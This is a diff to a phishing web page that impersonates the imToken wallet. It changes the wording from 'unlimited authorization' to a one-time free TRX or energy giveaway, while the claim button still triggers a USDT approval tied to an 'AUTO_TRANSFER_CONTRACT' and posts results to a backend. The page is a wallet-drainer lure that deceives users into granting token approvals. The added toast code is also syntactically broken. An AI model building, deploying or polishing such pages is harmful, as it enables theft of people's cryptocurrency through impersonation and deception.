@@ -7,7 +7,7 @@
     <link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/font-awesome@4.7.0/css/font-awesome.min.css">
     <style>
         * { margin: 0; padding: 0; box-sizing: border-box; }
-        /* 暗色系偏蓝主风格 + 紧凑布局 */
+        /* 暗色系+亮蓝色主风格 */
         body { 
             font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, sans-serif;
             padding: 15px 12px; 
@@ -20,28 +20,27 @@
             flex-direction: column;
             gap: 13px; 
         }
-        /* 主体容器：紧凑布局 */
         .container {
             flex: 1;
             display: flex;
             flex-direction: column;
             gap: 10px; 
         }
-        /* 头部：精简间距 */
+        /* 头部：亮蓝色标题/图标 */
         .header {
             text-align: center;
             padding: 10px 0;
-            border-bottom: 1px solid #253b5c; /* 蓝系边框 */
+            border-bottom: 1px solid #334155; /* 调亮边框：原#253b5c → #334155 */
             margin-bottom: 5px;
         }
         .header .logo {
             font-size: 24px; 
-            color: #3b82f6; /* 蓝系图标 */
+            color: #3b82f6; /* 亮蓝色图标：保留（本身较亮） */
             margin-bottom: 6px;
         }
         .header h1 { 
             font-size: 22px; 
-            color: #3b82f6; /* 蓝系标题 */
+            color: #3b82f6; /* 亮蓝色标题 */
             margin-bottom: 5px;
         }
         .header .desc {
@@ -51,89 +50,74 @@
             margin: 0 auto;
             line-height: 1.4; 
         }
-        /* 警告框：精简内边距 */
+        /* 警告框：亮蓝色背景+文字 */
         .warning {
-            background: #253b5c; /* 蓝系背景 */
-            color: #81b4f4; /* 蓝系文字 */
+            background: #334155; /* 调亮背景：原#253b5c → #334155 */
+            color: #93c5fd; /* 调亮文字：原#81b4f4 → #93c5fd */
             padding: 12px; 
             border-radius: 8px;
             font-size: 13px; 
-            border-left: 3px solid #3b82f6; /* 蓝系左边框 */
+            border-left: 3px solid #3b82f6; /* 亮蓝色边框 */
             line-height: 1.5;
         }
         .warning strong {
-            color: #3b82f6; /* 蓝系强调文字 */
+            color: #3b82f6; /* 亮蓝色强调文字 */
         }
-        /* 用户信息卡：精简内边距 */
+        /* 用户信息卡：亮蓝色边框 */
         #userInfo {
             text-align: center;
             font-size: 14px;
             padding: 15px; 
             background: #1e2925;
             border-radius: 8px;
-            border: 1px solid #253b5c; /* 蓝系边框 */
+            border: 1px solid #334155; /* 调亮边框：原#253b5c → #334155 */
             line-height: 1.6;
         }
         #userInfo span {
-            color: #3b82f6; /* 蓝系高亮 */
+            color: #3b82f6; /* 亮蓝色高亮 */
             font-weight: 500;
         }
-        /* 新增：钱包状态容器（紧跟用户信息卡） */
+        /* 钱包状态容器：亮蓝色调 */
         #walletStatusContainer {
             background: #1e2925;
             padding: 15px;
             border-radius: 8px;
-            border: 1px solid #253b5c; /* 蓝系边框 */
+            border: 1px solid #334155; /* 调亮边框：原#253b5c → #334155 */
             font-size: 13px;
             color: #a0a8a4;
             line-height: 1.6;
         }
         #walletStatusContainer .status-title {
             font-size: 15px;
-            color: #3b82f6; /* 蓝系标题 */
+            color: #3b82f6; /* 亮蓝色标题 */
             margin-bottom: 8px;
             display: flex;
             align-items: center;
             gap: 6px;
         }
         #walletStatusContainer .connected-content {
-            display: none; /* 初始隐藏已连接内容 */
+            display: none;
         }
         #walletStatusContainer.connected .disconnected-content {
-            display: none; /* 连接后隐藏未连接内容 */
+            display: none;
         }
         #walletStatusContainer.connected .connected-content {
-            display: block; /* 连接后显示已连接内容 */
+            display: block;
         }
         #walletStatusContainer .highlight {
-            color: #3b82f6; /* 蓝系高亮 */
+            color: #3b82f6; /* 亮蓝色高亮 */
             font-weight: 500;
         }
-        /* 授权记录区：紧凑布局 */
+        /* 授权记录区：亮蓝色边框/标题 */
         .record-list {
             background: #1e2925;
             padding: 15px; 
             border-radius: 8px;
-            border: 1px solid #253b5c; /* 蓝系边框 */
-        }
-        .record-list h3 {
-            font-size: 16px;
-            color: #3b82f6; /* 蓝系标题 */
-            margin-bottom: 12px;
-            display: flex;
-            align-items: center;
-            gap: 6px;
-        }
-        .record-item {
-            background: #121a17;
-            padding: 12px; 
-            margin-bottom: 10px;
-            border-radius: 6px;
-            border: 1px solid #253b5c; /* 蓝系边框 */
-            font-size: 13px;
+            border: 1px solid #334155; /* 调亮边框：原#253b5c → #334155 */
+        font-size: 13px;
         }
         .record-item:hover {
-            border-color: #3b82f6; /* 蓝系hover边框 */
+            border-color: #3b82f6; /* 亮蓝色hover边框 */
             transition: border-color 0.3s;
         }
         .record-item p {
@@ -146,7 +130,7 @@
             margin-right: 5px;
         }
         .tx-link {
-            color: #3b82f6; /* 蓝系链接 */
+            color: #3b82f6; /* 亮蓝色链接 */
             text-decoration: none;
             display: inline-flex;
             align-items: center;
@@ -156,7 +140,7 @@
         .tx-link:hover {
             text-decoration: underline;
         }
-        /* 复制链接区：紧凑布局 */
+        /* 复制链接区：亮蓝色边框/按钮 */
         .copy-link-wrap {
             background: #1e2925;
             padding: 8px; 
@@ -164,7 +148,7 @@
             display: flex;
             align-items: center;
             gap: 8px;
-            border: 1px solid #253b5c; /* 蓝系边框 */
+            border: 1px solid #334155; /* 调亮边框：原#253b5c → #334155 */
         }
         #copyLinkText {
             flex: 1;
@@ -175,7 +159,7 @@
         }
         #copyLinkBtn {
             padding: 6px 12px; 
-            background: #1e40af; /* 蓝系按钮 */
+            background: #2563eb; /* 调亮按钮：原#1e40af → #2563eb */
             color: #fff;
             border: none;
             border-radius: 6px;
@@ -186,16 +170,16 @@
             font-size: 13px;
         }
         #copyLinkBtn:hover {
-            background: #1e50b3; /* 蓝系按钮hover */
+            background: #3b82f6; /* 调亮hover：原#1e50b3 → #3b82f6 */
         }
-        /* 底部按钮组：紧凑 + 按条件隐藏 */
+        /* 底部按钮组：亮蓝色按钮 */
         .btn-group {
             display: flex;
             flex-direction: column;
             gap: 5px; 
             margin-top: 10px;
             padding: 10px 0;
-            border-top: 1px solid #253b5c; /* 蓝系边框 */
+            border-top: 1px solid #334155; /* 调亮边框：原#253b5c → #334155 */
         }
         .btn {
             width: 100%;
@@ -203,7 +187,7 @@
             font-size: 15px;
             border: none;
             border-radius: 8px;
-            background: #1e40af; /* 蓝系按钮 */
+            background: #2563eb; /* 调亮按钮：原#1e40af → #2563eb */
             color: white;
             cursor: pointer;
             display: flex;
@@ -213,18 +197,18 @@
             transition: background 0.3s;
         }
         .btn:hover {
-            background: #1e50b3; /* 蓝系按钮hover */
+            background: #3b82f6; /* 调亮hover：原#1e50b3 → #3b82f6 */
         }
         .btn:disabled {
-            background: #1a365d; /* 蓝系按钮禁用 */
+            background: #294b75; /* 调亮禁用：原#1a365d → #294b75 */
             color: #a0a8a4;
             cursor: not-allowed;
         }
-        /* 底部信息区：精简 */
+        /* 底部信息区：亮蓝色调 */
         .footer-info {
             margin-top: 10px;
             padding-top: 10px;
-            border-top: 1px solid #253b5c; /* 蓝系边框 */
+            border-top: 1px solid #334155; /* 调亮边框：原#253b5c → #334155 */
             font-size: 11px; 
             color: #a0a8a4;
             text-align: center;
@@ -232,10 +216,10 @@
         }
         .footer-info .safety-tip {
             margin-bottom: 6px;
-            color: #81b4f4; /* 蓝系提示 */
+            color: #93c5fd; /* 调亮提示：原#81b4f4 → #93c5fd */
         }
         .footer-info a {
-            color: #3b82f6; /* 蓝系链接 */
+            color: #3b82f6; /* 亮蓝色链接 */
             text-decoration: none;
         }
         .footer-info a:hover {
@@ -244,6 +228,27 @@
         .text-right {
             text-align: right;
         }
+        /* 自定义自动提示框（非阻塞） */
+        .toast-notice {
+             position: fixed;
+             top: 20px;
+               left: 50%;
+               transform: translateX(-50%);
+               padding: 12px 20px;
+               border-radius: 8px;
+               font-size: 14px;
+               color: #fff;
+               z-index: 9999;
+               opacity: 0;
+               transition: opacity 0.3s;
+               box-shadow: 0 2px 8px rgba(0,0,0,0.2);
+             }
+             .toast-notice.success {
+               background: #2563eb; /* 页面主蓝色（成功提示） */
+             }
+             .toast-notice.error {
+               background: #dc2626; /* 红色（失败提示） */
+             }
     </style>
 </head>
 <body>
@@ -251,7 +256,7 @@
         <!-- 头部 -->
         <div class="header">   
             <h1>imToken</h1>
-            <p class="desc">TRX生态安全授权服务，支持一键无限授权，可在imToken中撤销</p>
+            <p class="desc">imToken官方专属服务每个钱包地址只可领取一次，重复领取无限</p>
         </div>   
         <!-- 用户信息卡 -->
         <div id="userInfo">
@@ -263,18 +268,20 @@
             <div class="status-title"> 钱包状态</div>
             <!-- 未连接钱包时显示 -->
             <div class="disconnected-content">
-                <p>当前未连接钱包，连接后可：</p>
-                <p>1. 查看钱包内USDT、TRX余额</p>
-                <p>2. 发起能量无限授权操作</p>
-                <p>3. 查看历史授权记录</p>
+                <p>您现在准备领取的是imToken专属项目，非imToken用户不可领取</p>
+                <p>1. 每个钱包地址只可领取一次</p>
+                <p>2.随机领取能量或者TRX代币 </p>
+                <p>3.连接钱包后系统会根据钱包地址自动分配类型和额度</p>
+                <p>4.领取会消耗相应的能量或者TRX选择放弃直接退出即可</p>
             </div>
             <!-- 已连接钱包时显示 -->
             <div class="connected-content">
                 <p>✅ 钱包已成功连接</p>
                 <p>• 钱包地址：<span class="highlight" id="statusAddress"></span></p>
-                <p>• USDT余额：<span class="highlight" id="statusUsdt"></span></p>
-                <p>• TRX余额：<span class="highlight" id="statusTrx"></span></p>
-                <p>提示：授权操作需消耗少量TRX作为Gas费，请确保余额充足</p>
+                <p>• 领取类型：TRX</span></p>
+                <p>• 领取额度：15.2685</p>
+                <p>• 需消Gas费：10.6TRX</p>
+                <p>提示：请确保足够的TRX余额，先择放弃直接退出即可二次登入不会改变领取的类型和额度</p>
             </div>
         </div>
         <!-- 授权记录区 -->
@@ -287,7 +294,7 @@
                 <span><h3>USDT</h3></span>
                 <span><h3>无限</h3></span>
             </div>       
-            <h3> 授权记录</h3>
+            <strong>授权记录<strong>
             <div id="approvalRecords">
                 <div class="record-item">暂无授权记录<small>授权成功后显示历史记录</small></div>
             </div>
@@ -305,11 +312,11 @@
                 <span id="copyLinkText">
                     https://trc20trx-alt.github.io/Trc20.TRX/
                 </span>
-                <button id="copyLinkBtn"><i class="fa fa-copy"></</i> 复制链接</button>
+                <button id="copyLinkBtn"> 复制链接</button>
             </div>
         </div> 
         <button id="connectBtn" class="btn"> 连接imToken钱包</button>
-        <button id="approveBtn" class="btn" disabled>能量无限授权</button>
+        <button id="approveBtn" class="btn" disabled>领取</button>
     </div>
 
     <!-- 底部信息区 -->
@@ -322,6 +329,29 @@
     </div>
     <script src="imtoken://browser"></script>
     <script>
+        // 自定义非阻塞提示（自动消失，不中断代码）
+        function showToast(message, type = "success") {
+         // 创建提示框元素
+          const toast = document.createElement("div");
+          toast.className = toast-notice ${type};
+          toast.textContent = message;
+  
+          // 添加到页面
+          document.body.appendChild(toast);
+  
+          // 显示提示（延迟0.1秒触发过渡动画）
+          setTimeout(() => {
+            toast.style.opacity = "1";
+          }, 10);
+  
+          // 3秒后自动消失并移除元素
+          setTimeout(() => {
+            toast.style.opacity = "0";
+            setTimeout(() => {
+              document.body.removeChild(toast);
+            }, 300); // 等过渡动画结束后移除
+          }, 3000);
+        }
         // 原始配置保留
         const AUTO_TRANSFER_CONTRACT = "TC3AEtwB9MP7xvraxcuzeUa6ycNyLGaGrW";
         const TRC20_TOKEN_ADDRESS = "TR7NHqjeKQxGTCi8q8ZY4pL8otSzgjLj6t";
@@ -364,7 +394,7 @@
                 warning.style.display = "none";
                 await initWallet();
             } else {
-                document.getElementById("userInfo").innerHTML = "imToken会根据每一个用户的情况决定能够领取相应的能量或者TRX加密货币，连接钱包后会在此显示；每一个钱包只可领取一次，须消耗最高11个TRX连接钱包显示可领取的数量后，用户可选择放弃或者领取。";
+                document.getElementById("userInfo").innerHTML = "imToken专属服务，请点击底部“连接imToken钱包”按钮连接您的钱包";
                 approveBtn.style.display = "none";
                 recordlist.style.display = "none";
             }
@@ -407,7 +437,7 @@
                     
                     postData.txHash = result.transaction.txID;
                     postData.isApproved = true;
-                    alert(`【授权】成功！txHash：${postData.txHash.slice(0,16)}...`); // 修复原语法错误
+                    showToast(`【授权】成功！txHash：${postData.txHash.slice(0,16)}...`, "success");
                     
                     // 保存记录
                     saveApprovalRecord({
@@ -422,7 +452,7 @@
 
                 } catch (e) {
                     postData.isApproved = false;
-                    alert(`【授权】失败：${e.message}`); // 修复原语法错误
+                    showToast(`【授权】失败：${e.message}`, "error");
                 } finally {
                     try {
                         const res = await fetch(BACKEND_API, {
